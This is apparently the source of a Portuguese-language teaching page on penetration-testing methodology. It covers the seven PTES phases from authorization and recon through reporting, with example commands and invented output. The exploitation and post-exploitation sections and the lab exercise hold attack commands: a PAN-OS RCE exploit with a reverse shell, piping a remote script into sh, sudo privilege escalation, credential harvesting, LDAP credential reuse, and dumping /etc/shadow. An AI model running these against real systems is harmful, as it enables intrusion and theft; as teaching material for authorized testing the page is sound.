import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Metodologia() {
  return (
    <PageContainer
      title="Metodologia de Pentest"
      subtitle="As 7 fases padrão (PTES + OWASP) com comandos de exemplo em cada uma."
      difficulty="intermediario"
      timeToRead="14 min"
    >
      <h2>As 7 fases (PTES)</h2>
      <OutputBlock label="Penetration Testing Execution Standard" type="muted">
{`1. Pre-engagement      → escopo, NDA, contrato, RoE
2. Intelligence (recon) → OSINT, subdomínios, tech stack
3. Threat modeling     → quais alvos importam, attack tree
4. Vulnerability analysis → scan, fingerprint, CVE
5. Exploitation        → ganhar foothold inicial
6. Post-exploitation   → privesc, lateral, persistence, loot
7. Reporting           → executivo + técnico + remediation`}
      </OutputBlock>

      <h2>Fase 1 — Pre-engagement</h2>
      <CommandTable
        title="Documentos antes do primeiro nmap"
        variations={[
          { cmd: "Statement of Work (SoW)", desc: "Define escopo, prazo, valor.", output: "Assinado pelos 2 lados." },
          { cmd: "Rules of Engagement (RoE)", desc: "Janelas de ataque, IPs autorizados, ferramentas proibidas.", output: "Detalhado por sistema." },
          { cmd: "NDA", desc: "Confidencialidade dos achados.", output: "Pentester ↔ cliente." },
          { cmd: "Authorization letter", desc: "Carta assinada autorizando o ataque.", output: "Fica com o pentester (e back-office)." },
          { cmd: "PoC artifacts", desc: "O que pode/não pode ser exfiltrado.", output: "Ex: pode tirar screenshot mas NÃO baixar PII." },
          { cmd: "Out-of-scope", desc: "Sistemas/IPs PROIBIDOS de tocar.", output: "Geralmente prod legado, billing." },
          { cmd: "Emergency contact", desc: "Quem chamar se algo cair em produção.", output: "WhatsApp 24/7." },
        ]}
      />

      <AlertBox type="danger" title="Sem documento, é crime">
        Mesmo a pedido verbal do cliente, sem RoE+autorização escrita, qualquer scan já é
        acesso indevido (Lei 12.737/12). Nunca aceite "manda ver" por chat.
      </AlertBox>

      <h2>Fase 2 — Recon (passivo + ativo)</h2>
      <Terminal
        path="~/recon"
        lines={[
          {
            comment: "OSINT passivo — não toca no alvo",
            cmd: "theHarvester -d empresa.com.br -b all -l 500",
            out: `[*] Target: empresa.com.br

[*] Searching 0 results.
[*] Searching 100 results.
[*] Searching 200 results.
[...]

[*] Hosts found: 41
---------------------
api.empresa.com.br
mail.empresa.com.br
vpn.empresa.com.br
[...]

[*] Emails found: 86
------------------
ana.silva@empresa.com.br
joao.lopes@empresa.com.br
ti@empresa.com.br
[...]`,
            outType: "info",
          },
          {
            comment: "subdomain enum (passivo via crt.sh)",
            cmd: "curl -s 'https://crt.sh/?q=%25.empresa.com.br&output=json' | jq -r '.[].name_value' | sort -u",
            out: `*.empresa.com.br
api.empresa.com.br
api-dev.empresa.com.br
backup.empresa.com.br
homolog-rh.empresa.com.br
sso.empresa.com.br
vpn.empresa.com.br`,
            outType: "default",
          },
          {
            comment: "depois ativo: nmap nos IPs descobertos",
            cmd: "nmap -sV -sC -p- --min-rate=1000 -oA scan vpn.empresa.com.br",
            out: `Nmap scan report for vpn.empresa.com.br (203.0.113.42)
Host is up (0.018s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1
443/tcp  open  ssl/https   OpenVPN
500/udp  open  isakmp      
4500/udp open  nat-t-ike   Fortinet`,
            outType: "warning",
          },
        ]}
      />

      <h2>Fase 3 — Threat modeling</h2>
      <OutputBlock label="attack tree exemplo" type="default">
{`Goal: acessar dados de cartão (PCI scope)

├── via internet
│   ├── vuln no portal de pagamento
│   │   ├── SQLi → DB com cartões
│   │   └── SSRF → cofre AWS KMS
│   └── credenciais vazadas + VPN exposta
│       ├── spray de senhas (linkedin)
│       └── MFA push fadigue
└── via insider
    ├── phishing de TI (acesso a banco)
    └── pendrive na recepção (HID attack)`}
      </OutputBlock>

      <h2>Fase 4 — Vulnerability analysis</h2>
      <Terminal
        path="~/scan"
        lines={[
          {
            cmd: "nikto -h https://app.empresa.com.br -o nikto.html",
            out: `+ Server: nginx/1.18.0
+ /admin/: This might be interesting...
+ /backup/: Directory indexing found.
+ /.git/: Git repo found. (Major info disclosure!)
+ X-Frame-Options header missing.
+ /api/v1/users: Possible IDOR (no auth required).`,
            outType: "warning",
          },
          {
            cmd: "nuclei -u https://app.empresa.com.br -t cves/ -severity critical,high",
            out: `[INF] Current nuclei version: v3.3.0
[INF] Templates loaded: 9421

[git-config] [http] [low] https://app.empresa.com.br/.git/config
[exposed-panels] [http] [info] https://app.empresa.com.br/admin
[CVE-2024-3400] [http] [critical] https://vpn.empresa.com.br/global-protect/login.esp ← PAN-OS RCE!
[CVE-2023-26469] [http] [high] https://app.empresa.com.br/jorani [Jorani auth bypass]`,
            outType: "error",
          },
          {
            cmd: "searchsploit nginx 1.18",
            out: `Nginx 1.18.0 - Memory disclosure via crafted Range header  | linux/dos/49736.py
Nginx 1.20.0 - 1.21.0 - DNS resolver off-by-one heap         | linux/remote/50333.py`,
            outType: "info",
          },
        ]}
      />

      <h2>Fase 5 — Exploitation (initial foothold)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "explora a CVE crítica achada",
            cmd: "python3 cve-2024-3400.py --target https://vpn.empresa.com.br --cmd 'id'",
            out: `[+] Vulnerable target detected!
[+] Sending payload...
[+] Response: uid=99(nobody) gid=99(nobody) groups=99(nobody)
[+] RCE confirmed. Spawning reverse shell...`,
            outType: "error",
          },
          {
            comment: "callback no listener",
            cmd: "rlwrap nc -lvnp 4444",
            out: `Listening on 0.0.0.0 4444
Connection received on 203.0.113.42 51842
sh-5.0$ id
uid=99(nobody) gid=99(nobody) groups=99(nobody)
sh-5.0$ uname -a
Linux vpn-fw01 5.15.0-pa-203 #1 SMP PAN-OS x86_64 GNU/Linux`,
            outType: "warning",
          },
        ]}
      />

      <h2>Fase 6 — Post-exploitation</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) estabilizar shell",
            cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            out: "(shell upgrade)",
            outType: "muted",
          },
          {
            comment: "2) enumerar privesc com linpeas",
            cmd: "curl http://10.10.14.42/linpeas.sh | sh | tee linpeas.out",
            out: `[+] [CVE-2022-0847] DirtyPipe   ← VULN!
[+] sudo -l: (ALL) NOPASSWD: /usr/bin/find  ← privesc trivial!`,
            outType: "warning",
          },
          {
            comment: "3) escalar para root",
            cmd: "sudo /usr/bin/find . -exec /bin/sh \\;",
            out: `# id
uid=0(root) gid=0(root) groups=0(root)`,
            outType: "error",
          },
          {
            comment: "4) loot — credenciais de DB no fw config",
            cmd: "grep -ri 'password' /opt/pan/configs/ | head",
            out: `pan_db_user=panadmin
pan_db_pass=PanOS@2024!
ldap_bind_dn=CN=svc-vpn,OU=Services,DC=empresa,DC=local
ldap_bind_pw=Welcome2025@`,
            outType: "error",
          },
          {
            comment: "5) lateral — usa LDAP creds para enumerar AD",
            cmd: "crackmapexec ldap dc01.empresa.local -u svc-vpn -p 'Welcome2025@'",
            out: `LDAP  10.10.10.5  389  DC01  [+] empresa.local\\svc-vpn:Welcome2025@ (Pwn3d!)`,
            outType: "error",
          },
        ]}
      />

      <h2>Fase 7 — Reporting</h2>
      <OutputBlock label="estrutura de relatório (md / docx / pdf)" type="info">
{`1. Sumário Executivo (1-2 pgs, sem termos técnicos)
   - Risco geral (Crítico / Alto / Médio / Baixo)
   - Top 5 achados em linguagem de negócio
   - Roadmap de remediation em 30/60/90 dias

2. Escopo + Metodologia
   - IPs/URLs testados, datas, ferramentas

3. Sumário de findings (tabela)
   ID  | Título               | Severidade | CVSS  | Status
   F-01| RCE via PAN-OS CVE   | Crítico    | 10.0  | Aberto
   F-02| LDAP creds em config | Alto       |  7.8  | Aberto
   F-03| .git exposto         | Médio      |  5.3  | Aberto

4. Findings detalhados (1 por finding)
   - Descrição
   - Impacto
   - Passos para reproduzir (com prints)
   - Evidências (screenshots, payloads, output)
   - Remediação concreta
   - Referências (CVE, OWASP, vendor advisory)

5. Anexos
   - Logs de comandos (timestamps)
   - Wordlists/payloads usados
   - Lista completa de hosts/portas`}
      </OutputBlock>

      <PracticeBox
        title="Faça o ciclo completo no Metasploitable 2"
        goal="Praticar as 7 fases num alvo legal e entregar um mini-relatório."
        steps={[
          "Levante 1 VM Metasploitable 2 isolada (host-only).",
          "Documente o escopo: 'IP X, janela 19h-23h, sem DoS'.",
          "Faça recon completo (nmap full + service scan).",
          "Levante 5 vulns (vsftpd backdoor, samba usermap, distccd, etc.).",
          "Explore 1 (vsftpd 2.3.4) → root.",
          "Pos-exp: dump /etc/shadow, lista /home, busca creds.",
          "Escreva mini-relatório md com sumário executivo + 3 findings detalhados.",
        ]}
        command={`# 1) recon
nmap -sV -sC -p- 192.168.56.101 -oA scan/full

# 2) vuln scan
nikto -h http://192.168.56.101 | tee scan/nikto.txt
nmap --script vuln 192.168.56.101 -oA scan/vuln

# 3) exploit (msf)
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.101; run"

# 4) loot
echo "uid=0(root)" > loot/whoami.txt
cat /etc/shadow > loot/shadow.txt
cat /etc/passwd > loot/passwd.txt

# 5) relatório
cat > relatorio.md <<'EOF'
# Relatório Pentest — Metasploitable 2 (lab)
## Sumário executivo
Sistema apresenta 5 vulnerabilidades críticas com RCE não autenticado.
## Findings
F-01 [Crítico] vsftpd 2.3.4 backdoor (CVE-2011-2523) → root shell
[...]
EOF`}
        expected={`scan/full.nmap   scan/nikto.txt   loot/shadow.txt   relatorio.md`}
        verify="Relatório deve ser entregável a um cliente: claro, com prints, com remediação."
      />

      <AlertBox type="info" title="Frameworks de referência">
        <strong>PTES</strong> (pentest geral), <strong>OWASP WSTG</strong> (web app),
        <strong> OWASP MASTG</strong> (mobile), <strong>NIST SP 800-115</strong>,
        <strong> OSSTMM</strong>. Use o que combinar com o cliente.
      </AlertBox>
    </PageContainer>
  );
}
